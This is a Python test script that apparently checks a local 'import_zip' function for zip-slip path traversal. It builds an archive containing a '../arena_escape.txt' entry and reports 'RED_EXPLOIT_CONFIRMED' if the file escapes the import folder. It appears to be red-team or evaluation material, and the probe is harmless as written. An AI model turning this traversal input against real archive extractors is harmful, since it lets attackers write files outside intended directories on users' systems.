#!/usr/bin/env python3
import argparse
import os
import sys
import tempfile
from pathlib import Path
from zipfile import ZipFile

from app import import_zip

MARKER = b"zip-slip-confirmation-payload\n"
CONFIRM = "RED_EXPLOIT_CONFIRMED"


def build_zip(zip_path: Path) -> None:
    with ZipFile(zip_path, "w") as zf:
        zf.writestr("../arena_escape.txt", MARKER)
        zf.writestr("inside.txt", b"benign control file\n")


def run_probe() -> bool:
    with tempfile.TemporaryDirectory(prefix="red_zip_slip_") as tmp:
        root = Path(tmp).resolve()
        destination = root / "import_workspace"
        zip_path = root / "payload.zip"
        escape_path = root / "arena_escape.txt"

        if escape_path.exists():
            escape_path.unlink()

        build_zip(zip_path)
        try:
            import_zip(str(zip_path), str(destination))
        except Exception as exc:
            print("import_zip raised: %s" % (exc,), file=sys.stderr)
            return False

        if not escape_path.exists():
            print("escape file was not created outside destination", file=sys.stderr)
            return False
        try:
            data = escape_path.read_bytes()
        except OSError as exc:
            print("escape file could not be read: %s" % (exc,), file=sys.stderr)
            return False
        if data != MARKER:
            print("escape file content mismatch", file=sys.stderr)
            return False
        if not (destination / "inside.txt").exists():
            print("control file was not imported", file=sys.stderr)
            return False
        return True


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--expect-vulnerable", action="store_true")
    args = parser.parse_args()

    vulnerable = run_probe()
    if args.expect_vulnerable:
        if vulnerable:
            print(CONFIRM)
            return 0
        return 1

    if vulnerable:
        print(CONFIRM)
        return 0
    print("not vulnerable")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
